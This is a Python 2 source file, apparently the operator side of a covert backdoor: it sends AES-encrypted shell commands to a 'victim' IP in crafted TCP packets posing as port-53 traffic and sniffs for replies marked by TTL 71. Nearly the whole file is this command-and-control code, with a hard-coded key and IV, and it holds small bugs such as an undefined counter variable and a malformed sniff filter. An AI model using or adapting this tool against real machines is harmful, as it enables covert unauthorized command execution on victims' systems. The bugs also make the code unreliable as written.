'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    blackhat.py
--
--  AUTHOR:         Thilina Ratnayake
--              
--  PROGRAM:        Initiates a connection with a target by crafting its own 
--                  packets, and establishes a remote shell.
--
--  FUNCTIONS:      sendCommand(string)
--                  craftCommandPacket(string)
--                  encryptCommand(string)
--                  commandResult(packet)
--
--  DATE:           October 17, 2015
--
--  REVISIONS:      
--
--  NOTES:
--  The program requires the PyCrypto and Scapy libraries for encryption and packet
--  crafting respectively.
--  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
--  'pip install scapy' or http://www.secdev.org/projects/scapy/
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

#################################IMPORTS#########################################
import sys # For getting command line arguments
from scapy.all import * #Scapy library used to craft packets
from Crypto.Cipher import AES #PiCrypto used for encrypting commands in AES
import time #used for thread sleep methods


#################################GLOBAL VARIABLES#################################
global targetIP
global sourcePort

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       Usage
--  Parameters:
--     None
--  Return Values:
--      None.
--  Description:
--      Ensures that user enters in the proper values by checking the number of arguments
--      Command should be in the format python blackhat.py <targetIP> <sourcePort>
--      i.e. - python blackhat.py 192.168.1.1 500
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''        
def usage():
    global targetIP
    if len(sys.argv) < 2:
        print "Please use format python blackhat.py targetIP sourcePort"
        sys.exit()
    else:
        targetIP = sys.argv[1]
        print "START Victim IP is %s"%(targetIP)
        global sourcePort
        sourcePort = sys.argv[2]
        print "START Sending from Blackhat port: %s"%(sourcePort)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       encryptCommand
--  Parameters:
--      String
--          The user's command string to added into the packet payload
--  Return Values:
--      Encrypted command string
--  Description:
--      Function encrypts the plaintext command entered by user using PyCrypto.
--      Encrypted with AES CFB. 
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def encryptCommand(command):
    key='0123456789abcdef'
    IV = "abcdefghijklmnop"
    encryptor = AES.new(key,AES.MODE_CFB,IV=IV)
    return encryptor.encrypt(command)

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       sendCommand
--  Parameters:
--      String
--          The user's command string to added into the packet payload
--  Return Values:
--      None
--  Description:
--      Function takes a string, crads a packet and adds the string to its payload
--      using craftCommandPacket() and then sends it.
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' 
def sendCommand(command):
    """Takes in user supplied command string and initiates port knocking (if required)
    and sending of the command"""
    #If it's the first command, send the port knocks
    global counter
    print "The counter is at %d"%(counter)
    send(craftCommandPacket(command));
    return;

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       craftCommandPacket
--  Parameters:
--      String
--          The user's command string to added into the packet payload
--  Return Values:
--      Packet
--  Description:
--      Function takes the string provided by the user and crafts a packet using
--      Scapy's API. The targetIP, and target Ports are taken from globals estab-
--      lished at program start.
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''' 
def craftCommandPacket(command):
    global targetIP
    global sourcePort
    #TODO:
    # data = encryptMessage(command)
    data = command
    packet = (IP(dst=targetIP,ttl=71)/TCP(sport=int(sourcePort),dport=53)/ data)
    return packet

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  FUNCTION
--  Name:       commandResult
--  Parameters:
--      Packet
--          The packet that returns after a command has been sent to the Target.
--  Return Values:
--      True - Continue with code execution
--      False - Keep filtering for packets.
--  Description:
--      Function executes after a packet has been received from the Target. 
--      Authenticates that is actually from the backdoor program by looking
--      at the TTL, should be 71. 
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
def commandResult(packet):
    if IP in packet[0]:
        global targetIP
        srcIP = packet[IP].src
        ttl = packet[IP].ttl
        if srcIP == targetIP and ttl ==71:
            print packet.load
            return True
        else:
            return False
    else:
        return False



if __name__ == "__main__":
    usage()
    # Go into the send/receive loop
    while True:
        print "ENTER COMMAND -> " + targetIP + ":"
        command = raw_input()
        sendCommand(encryptCommand(command))
        sniff(timeout=1, filter="tcp and and dst port 500 and src port 53", stop_filter=commandResult)
